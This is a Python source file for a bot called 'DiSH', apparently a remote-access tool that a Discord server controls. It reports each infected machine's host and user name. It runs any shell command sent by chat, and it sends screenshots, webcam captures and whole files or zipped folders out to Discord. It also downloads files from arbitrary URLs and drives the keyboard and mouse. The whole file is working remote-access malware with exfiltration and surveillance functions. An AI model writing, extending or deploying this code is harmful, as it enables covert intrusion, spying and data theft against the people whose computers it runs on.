import asyncio
import functools
import os
import platform
import shutil
import socket
import subprocess
import time
import traceback
import webbrowser
from datetime import datetime
from io import BytesIO
import tempfile
import aiohttp
import discord
import dotenv
import pyautogui
import requests
import yaml
from PIL import ImageGrab
import simpleaudio
import ffmpeg
import cv2

# Dirs and other useless stuff start here!

pyautogui.PAUSE = 0.25

formatted_now = datetime.now().strftime("%d-%m-%Y %Y-%M-%S")

dish_dir = (
    os.path.normpath(os.environ["appdata"] + "/dish/")
    if os.path.exists(os.environ["appdata"] + "/dish/")
    and platform.system().lower() == "windows"
    else "."
)

dotenv_path = (
    os.path.normpath(os.environ["appdata"] + "/dish/.env")
    if os.path.exists(os.environ["appdata"] + "/dish/.env")
    else ".env"
)
try:
    dotenv.load_dotenv(dotenv_path)
except:
    traceback.print_exc()

# Useless stuff starts here


with open("cz.yaml", "r") as stream:
    try:
        version = yaml.safe_load(stream)["commitizen"]["version"]
    except yaml.YAMLError as exc:
        print(exc)


print(f"Starting DiSH v{version}")

# DiSH variables start here!

guild_id: int = int(os.getenv("GUILD_ID"))
category_id: int = int(os.getenv("CATEGORY_ID"))
try:
    token: str = os.environ["TOKEN"]
except:
    traceback.print_exc()
    exit("No token specified")

editor_filename = ""
file_content = ""


async def press(client: discord.Client, message: discord.Message, args: str):
    keys = args.split(" ")
    for a in keys:
        pyautogui.press(a)
    await message.reply(f"Pressed {', '.join(keys)}")


async def typewrite(client: discord.Client, message: discord.Message, args: str):
    pyautogui.typewrite(args)
    await message.reply(f"Typed {args}")


async def hotkey(client: discord.Client, message: discord.Message, args: str):
    keys = args.split(" ")
    for a in keys:
        pyautogui.keyDown(a)
    for a in reversed(keys):
        pyautogui.keyUp(a)
    await message.reply(f"Send hotkey with commands {', '.join(keys)}")


async def specialKeys(client: discord.Client, message: discord.Message, args: str):
    await message.reply("\n".join(pyautogui.KEY_NAMES))

async def cam(client:discord.Client, message:discord.Message, args:str):
    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as temp:
        o = cv2.VideoCapture(0)
        s, img = o.read()
        cv2.imwrite(temp.name, img)
        await message.channel.send(file=discord.File(temp.name))
        o.release()
        temp.close()
        os.unlink(temp.name)

async def loc(client: discord.Client, message: discord.Message, args: str):
    if len(message.attachments) == 0:
        return await message.reply("No file specified")
    fileUrl = message.attachments[0].url
    res = requests.get(fileUrl, stream=True)
    with open(message.attachments[0].filename, "wb") as f:
        f.write(res.content)

    try:
        pos = pyautogui.locateOnScreen(message.attachments[0].filename, confidence=0.8)
        if pos == None:
            os.remove(message.attachments[0].filename)
            return await message.reply("Image not found :/")
        pyautogui.click(pos)
        await message.reply("Clicked at " + str(pos))
    except Exception as e:
        print(e)
        await message.reply("No image found :/")
    os.remove(message.attachments[0].filename)


async def click(client: discord.Client, message: discord.Message, args: str):
    pos = args.split(" ")
    pyautogui.click(int(pos[0]), int(pos[1]))
    await message.reply("Clicked at " + str(pos))


async def play(client: discord.Client, message: discord.Message, args: str):
    """
    It plays the sound file that was attached to the message

    :param client: The client object
    :type client: discord.Client
    :param message: discord.Message
    :type message: discord.Message
    :param args: str - The arguments passed to the command
    :type args: str
    """
    async with aiohttp.ClientSession() as session:
        async with session.get(message.attachments[0].url) as res:
            print(
                "Extension of file: " + message.attachments[0].filename.split(".")[-1]
            )

            with open(message.attachments[0].filename, "wb") as f:
                f.write(await res.read())
    await message.reply("Started encoding file to wav")
    (ffmpeg
    .input(message.attachments[0].filename)
    .output(".".join(message.attachments[0].filename.split(".")[:-1])+".wav") # Take the message attachment name > Split in [.]s > remove the last one (extension) > Join with [.]s > add the .wav  
    .run()
    )
    await message.reply("Finished encoding file to wav")
    obj = simpleaudio.WaveObject.from_wave_file(".".join(message.attachments[0].filename.split(".")[:-1])+".wav")
    ply = obj.play()
    ply.wait_done()
    m = await message.reply("Playing audio...")
    
    os.remove(message.attachments[0].filename)
    os.remove(".".join(message.attachments[0].filename.split(".")[:-1])+".wav")
    await m.reply("Done playing!")


def exec_command(command):
    """
    It executes a command and returns the output and error messages as a tuple.

    :param command: The command to be executed
    :return: A tuple of the stdout and stderr of the command.
    """

    exec = subprocess.run(command, capture_output=True, text=True, shell=True)
    return (exec.stdout, exec.stderr)


async def dump(client: discord.Client, message: discord.Message, args: str):
    """
    It takes a file or directory, and sends it to the channel.

    :param client: discord.Client
    :type client: discord.Client
    :param message: discord.Message
    :type message: discord.Message
    :param args: str
    :type args: str
    :return: The file is being returned.
    """
    if not os.path.exists(args):
        return await message.channel.send("Not existing-file")

    if os.path.isdir(args):
        executor = functools.partial(shutil.make_archive, args, "zip", args)
        await client.loop.run_in_executor(None, executor)
        return await message.channel.send(file=discord.File(args + ".zip"))

    with open(args, "rb") as fp:
        await message.channel.send(file=discord.File(fp))


async def screenshot(client: discord.Client, message: discord.Message, args: str):

    """
    It takes a screenshot of the entire screen, saves it to a file, and sends it to the channel the
    command was sent in

    :param client: discord.Client - The client that the command was called from
    :type client: discord.Client
    :param message: discord.Message = The message object that triggered the command
    :type message: discord.Message
    :param args: str = The arguments passed to the command
    :type args: str
    """
    img = ImageGrab.grab(all_screens=True)
    byteio = BytesIO()
    img.save(byteio, format="PNG")
    byteio.seek(0)
    await message.channel.send(file=discord.File(byteio, "screenshot.png"))


async def cd(client: discord.Client, message: discord.Message, args: str):
    """
    It changes the directory to the one specified in the arguments.

    :param client: The discord client
    :type client: discord.Client
    :param message: The message object that triggered the command
    :type message: discord.Message
    :param args: str - The arguments passed to the command
    :type args: str
    """
    print(args)
    os.chdir(args)
    await message.channel.send("Changed directory to " + args)


async def upload(client: discord.Client, message: discord.Message, args: str):
    """
    It downloads the file from the URL, and saves it to the specified location.

    :param client: discord.Client - The client that the command was called from
    :type client: discord.Client
    :param message: discord.Message = The message object that triggered the command
    :type message: discord.Message
    :param args: str = The arguments passed to the command
    :type args: str
    """
    file = message.attachments[0].url
    async with aiohttp.ClientSession() as session:
        async with session.get(file) as r:
            data = await r.read()
            with open(args, "wb") as fp:
                fp.write(data)
                await message.channel.send("Uploaded file to " + args)
                fp.close()
            r.close()
        await session.close()


async def download(client: discord.Client, message: discord.Message, args: str):

    """
    It downloads a file from a URL and saves it to a file.

    :param client: discord.Client - The client that the command was sent from
    :type client: discord.Client
    :param message: discord.Message = The message object that triggered the command
    :type message: discord.Message
    :param args: str = The arguments passed to the command
    :type args: str
    """
    url = args.split(" ")[0]
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as r:
            data = await r.read()
            with open(" ".join(args.split(" ")[1:]), "wb") as fp:
                fp.write(data)
                await message.channel.send(
                    "Downloaded file to " + " ".join(args.split(" ")[1:])
                )
                fp.close()
            r.close()
        await session.close()


async def edit(client: discord.Client, message: discord.Message, args: str):
    """
    It sends a message, sends a file, sends another message, waits for a message, writes the message
    content to the file, sends another message.

    :param client: the client object
    :type client: discord.Client
    :param message: The message that triggered the command
    :type message: discord.Message
    :param args: str
    :type args: str
    """
    await message.channel.send("Editing file " + args)
    try:
        await message.channel.send(file=discord.File(args))
    except:
        await message.channel.send("File does not exist :C")

    await message.channel.send("Send the new file content")
    try:
        file_content = await client.wait_for(
            "message", check=lambda m: m.author == message.author, timeout=120
        )
        f = open(args, "w")
        f.write(file_content.content)
        f.close()
        await message.channel.send("Edited file")
    except asyncio.TimeoutError:
        await message.channel.send("Too much time has passed :C")


async def pwd(client: discord.Client, message: discord.Message, args: str):

    """
    It sends a message to the channel the command was sent in, saying the current directory

    :param client: The client object
    :type client: discord.Client
    :param message: The message object that triggered the command
    :type message: discord.Message
    :param args: str
    :type args: str
    """
    await message.channel.send("Current directory is " + os.getcwd())


async def browser(client: discord.Client, message: discord.Message, args: str):
    """
    It opens a web browser and goes to the URL specified in the command.

    :param client: The client object
    :type client: discord.Client
    :param message: The message object that triggered the command
    :type message: discord.Message
    :param args: str
    :type args: str
    """

    webbrowser.open(args)


# It's a discord client that connects to a specific guild and category, and has a dictionary of
# modules that can be called.
class RemoteClient(discord.Client):
    def __init__(self, guild_id: int, category_id: int, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.guild_id: int = guild_id
        self.category_id: int = category_id
        self.hostname: str = socket.gethostname()
        self.channel = None
        self.modules = {
            "dump": dump,
            "cd": cd,
            "pwd": pwd,
            "browser": browser,
            "play": play,
            "screenshot": screenshot,
            "upload": upload,
            "download": download,
            "edit": edit,
            "press": press,
            "typewrite": typewrite,
            "hotkey": hotkey,
            "special": specialKeys,
            "loc": loc,
            "click": click,
            "cam":cam,
        }

    async def on_ready(self):
        """
        It creates a channel with the name of the hostname and username of the user that launched the
        bot.
        """
        print(f"Logged in as {self.user}")
        guild: discord.Guild = self.get_guild(self.guild_id)
        category: discord.CategoryChannel = guild.get_channel(self.category_id)
        channel_name: str = (
            self.hostname.lower().replace(" ", "-").replace(".", "")
            + "-"
            + os.getlogin().lower().replace(" ", "-").replace(".", "")
        )
        channel = guild.get_channel(int(os.getenv("LOGS_ID")))
        await channel.send(f"Bot launched on {self.hostname} as {os.getlogin()}")
        for a in category.text_channels:
            if a.name == channel_name:
                self.channel = a
        if self.channel == None:
            self.channel = await guild.create_text_channel(
                channel_name, category=category
            )
        print(self.channel.name)
        await self.channel.send(
            f"Bot launched succesfully on PC {self.hostname} as {os.getlogin()}"
        )

    async def on_message(self, message: discord.Message):
        """
        It takes a message, splits it into a list of words, and then tries to execute the first word as a
        command. If it can't find the command, it executes the message as a command in the command line.

        :param message: The message object that triggered the event
        :type message: discord.Message
        :return: The return value is a tuple of two strings, the first being the stdout and the second being
        the stderr.
        """

        if message.channel == self.channel or message.channel.id == int(
            os.getenv("GLOBAL_ID")
        ):
            if message.author.bot:
                return
            parsed = message.content.split(" ")
            try:
                print(self.modules[parsed[0]])
                if len(parsed) > 1:
                    await self.modules[parsed[0]](self, message, " ".join(parsed[1:]))
                else:
                    await self.modules[parsed[0]](self, message, "")
            except KeyError:
                # await message.channel.send(
                #     f"Command {parsed[0]} not found in ovverrides, executing from command line instead"
                # )
                executor = functools.partial(exec_command, parsed)
                res = await self.loop.run_in_executor(None, executor)

                try:
                    if len(res[0]) > 0:

                        await message.channel.send(f"Stdout: ```bat\n{res[0]}\n```")
                    if len(res[1]) > 0:
                        await message.channel.send(f"Stderr: ```bat\n{res[1]}\n```")
                except:
                    f = BytesIO(f"Stdout: {res[0]}\n\nStderr: {res[1]}```".encode())
                    await message.channel.send(file=discord.File(f, "output.txt"))

            except:
                traceback.print_exc()
                exc = traceback.format_exc()
                await message.channel.send(f"Python Errors: ```py\n{exc}\n```")


if __name__ == "__main__":
    connected = False
    while not connected:
        try:
            r = requests.get("https://example.com")
            if r.status_code == 200:
                connected = True

        except:
            pass
        time.sleep(1)

    client = RemoteClient(guild_id, category_id, intents=discord.Intents.all())
    client.run(token)
